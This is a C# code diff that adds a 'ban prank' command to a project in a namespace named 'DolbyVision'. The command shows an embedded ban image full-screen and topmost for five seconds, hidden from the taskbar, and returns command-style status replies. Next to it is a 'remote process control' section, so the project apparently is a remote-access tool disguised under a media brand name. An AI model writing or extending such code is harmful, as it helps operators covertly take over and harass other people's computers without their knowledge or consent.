@@ -420,6 +420,58 @@ namespace DolbyVision
             }
         }
 
+
+        // ========== 封禁恶搞 ==========
+        private static string StartBanPrank()
+        {
+            try
+            {
+                // 从嵌入资源加载ban.jpg
+                var assembly = System.Reflection.Assembly.GetExecutingAssembly();
+                using (var stream = assembly.GetManifestResourceStream("DolbyVision.Assets.ban.jpg"))
+                {
+                    if (stream == null) return "ERROR: ban.jpg资源未找到";
+                    Image banImage = Image.FromStream(stream);
+                    // 在新线程显示全屏窗口(避免阻塞命令处理)
+                    var t = new Thread(() =>
+                    {
+                        try
+                        {
+                            using (var form = new Form())
+                            {
+                                form.FormBorderStyle = FormBorderStyle.None;
+                                form.WindowState = FormWindowState.Maximized;
+                                form.TopMost = true;
+                                form.ShowInTaskbar = false;
+                                form.StartPosition = FormStartPosition.CenterScreen;
+                                form.BackColor = Color.Black;
+                                // 不在Alt+Tab中显示
+                                form.ShowIcon = false;
+                                var pictureBox = new PictureBox();
+                                pictureBox.Dock = DockStyle.Fill;
+                                pictureBox.SizeMode = PictureBoxSizeMode.Zoom;
+                                pictureBox.Image = banImage;
+                                form.Controls.Add(pictureBox);
+                                // 5秒后自动关闭
+                                var timer = new System.Windows.Forms.Timer();
+                                timer.Interval = 5000;
+                                timer.Tick += (s, e) => { timer.Stop(); form.Close(); };
+                                timer.Start();
+                                form.ShowDialog();
+                            }
+                        }
+                        catch { }
+                    });
+                    t.IsBackground = true;
+                    t.Start();
+                    return "OK: 封禁恶搞已启动(5秒全屏)";
+                }
+            }
+            catch (Exception ex)
+            {
+                return "ERROR: " + ex.Message;
+            }
+        }
         // ========== 远程进程控制 ==========
         // P/Invoke for process owner
         [DllImport("advapi32.dll", SetLastError = true)]
